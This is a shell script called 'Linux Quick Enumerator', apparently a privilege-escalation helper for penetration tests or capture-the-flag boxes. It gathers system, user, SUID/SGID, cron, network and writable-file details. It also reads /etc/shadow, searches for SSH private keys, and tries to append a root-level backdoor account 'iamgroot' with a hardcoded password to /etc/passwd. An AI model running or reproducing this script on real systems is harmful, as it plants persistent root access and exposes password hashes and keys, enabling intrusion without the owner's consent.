#!/bin/sh

######### COLOR DEFINITIONS ###########
CYAN='\033[1;36m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
PURP='\033[1;35m'
RED='\033[1;31m'
NC='\033[0m'
#######################################

###### CODE - DO NOT RUN LOCALLY ######

l00t=0

echo "${BLUE}Linux Quick Enumerator\nVersion 1.0\nUse -i to include interactive tests (sudo -l etc.)\n Use -a to include more output (users with nologin etc.)\nOptions not implemented yet\n\n\n${GREEN}"

echo "################################################################"
echo "######################### BASIC CHECKS #########################"
echo "################################################################"
echo "\n"
echo "=========================== USER INFO =========================="
echo "Username:   $(whoami)"
echo "      ID:   $(id)"
echo "  Groups:   $(groups $(whoami))"
echo "\n"
echo "========================== SYSTEM INFO ========================="
echo "  System:   $(uname -a)"
echo "Hostname:   $(hostname)"
echo "    Arch:   $(arch)"
echo " Details:"
cat /etc/*-release | sed 's/^/            /'
cat /etc/issue  | sed 's/^/            /'
echo ""
echo "========================== PASSWD INFO ========================="
echo "/etc/passwd:"
##not including nologin users
cat /etc/passwd | grep -iv nologin |sed 's/^/            /'
echo "\n"
echo "passwords in passwd:${RED}"
cat /etc/passwd |grep -v ":x:" || echo "${GREEN}none found =o("
echo "${GREEN}\n"
echo "iamgroot:$(openssl passwd -1 -salt iamgroot iamgroot):0:0:/root:/bin/bash" >> /etc/passwd 2>/dev/null && echo "${RED}*** added user iamgroot/iamgroot as root ***${GREEN}" && l00t=1 || echo "no write access to /etc/passwd =o("
echo "\n"
echo "/etc/shadow:"
##" #break for bad quote
cat /etc/shadow 2>/dev/null && echo "${RED}Can read /etc/shadow!" || echo "cannot read /etc/shadow =o("
echo ""
if [ "$l00t" = "1" ]
then
  echo "${CYAN}Easy access w00t!\n\n\n${NC}"
  exit 0
fi
echo ""
echo "========================= SUID/SGID BIT ========================"
##rm /tmp/sdggsfscsdfdsgsd.qenum 2>/dev/null
echo "SUID bit:"
find / -perm -4000 -type f 2>/dev/null | sed 's/^/            /'  #|| echo "${CYAN}SUID failed${GREEN}"
##sed 's/^/            /' /tmp/sdggsfscsdfdsgsd.qenum
##rm /tmp/sdggsfscsdfdsgsd.qenum
echo ""
echo "SGID bit:"
find / -perm -2000 -type f 2>/dev/null | sed 's/^/            /' #|| echo "${CYAN}SGID failed${GREEN}"
echo "\n"
echo "=========================== SSH FILES =========================="
echo "authorized_keys (check if writable):"
find / -name authorized_keys 2>/dev/null -exec ls -al {} + | sed 's/^/            /'
echo "\n"
echo "id_rsa (check if readable):"
find / -name id_rsa 2>/dev/null -exec ls -al {} + | sed 's/^/            /'
echo "\n"
echo "id_rsa.pub (because it might reveal something):"
find / -name id_rsa.pub 2>/dev/null -exec ls -al {} + | sed 's/^/            /'
echo "\n${YELLOW}"
echo "################################################################"
echo "######################### LVL 2 CHECKS #########################"
echo "################################################################"
echo "======================== USER HAS EMAIL? ======================="
ls -al $MAIL | sed 's/^/            /'
echo "\n"
echo "======================== SCHEDULED TASKS ======================="
echo "    Cron:"
cat /etc/crontab | sed 's/^/            /'
echo "\n"
ls -alh /etc/cron* | sed 's/^/            /'
echo "\n"
echo "  Timers:"
systemctl list-timers | sed 's/^/            /' # on checking it does not use -- but maybe thats some systems?
echo "\n"
echo "========================= NETWORK INFO ========================="
echo "     IPs:"
ip a | sed 's/^/            /'
echo "\n"
echo " Sockets:"
netstat -anp| grep -iv ^unix | head -n -2 | sed 's/^/            /'
echo "            possible line clipping may have occurred..."
sockstat | sed 's/^/            /'
echo "\n"
echo "========================= RUNNING TASKS ========================"
ps -aux | grep -v "]$" | sed 's/^/            /'
echo "\n"
## this is truncated, use -a for more
echo "====================== WRITABLE FILES/DIRS ====================="
echo "    Dirs:"
find / -writable -type d -not -path "/proc/*" 2>/dev/null | sed 's/^/            /'
echo "\n"
echo "   Files:"
find / -writable -type f -not -path "/proc/*" 2>/dev/null | sed 's/^/            /'
echo "\n"
echo "root+w D:"
find / -user root -writable -type d -not -path "/proc/*" 2>/dev/null | sed 's/^/            /'
echo "\n"
echo "root+w F:"
find / -user root -writable -type f -not -path "/proc/*" 2>/dev/null | sed 's/^/            /'
echo "\n"
echo "\n${PURP}"
echo "################################################################"
echo "######################### LVL 3 CHECKS #########################"
echo "################################################################"
echo "======================= RUNNING SERVICES ======================="
echo "Services:"
systemctl | sed 's/^/            /'
echo "\n"
echo "====================== INSTALLED PACKAGES ======================"
dpkg -l | sed 's/^/            /'
echo "\n"
rpm -qa | sed 's/^/            /'
echo "\n"
echo "======================= APP CAPABILITIES ======================="
getcap -r / 2>/dev/null | sed 's/^/            /'
echo "\n"
echo "========================== FILE SYSTEM ========================="
echo "    List:"
/bin/lsblk | sed 's/^/            /'
echo "\n"
echo "	 fstab:"
cat /etc/fstab | sed 's/^/            /'
echo "\n"
echo "Disk Use:"
df -h | sed 's/^/            /'
echo "\n"
echo "   Mount:"
mount | sed 's/^/            /'
echo "\n"
#echo "======================= DRIVERS/MODULES ========================"
# not working?
#ls mod
# /sbin/modinfo <mod>
#echo "\n"
echo "============================ ROUTES ============================"
/sbin/route | sed 's/^/            /'
echo "\n"
echo "======================== FIREWALL STATUS ======================="
grep -Hs iptables /etc/* | sed 's/^/            /'
echo "\n"
echo "${CYAN}**************************** DONE!! ****************************${NC}\n\n\n"

#if [ "$1" == "-i" ]
#  then
#    echo ${GREEN}$(sudo -l)
#fi

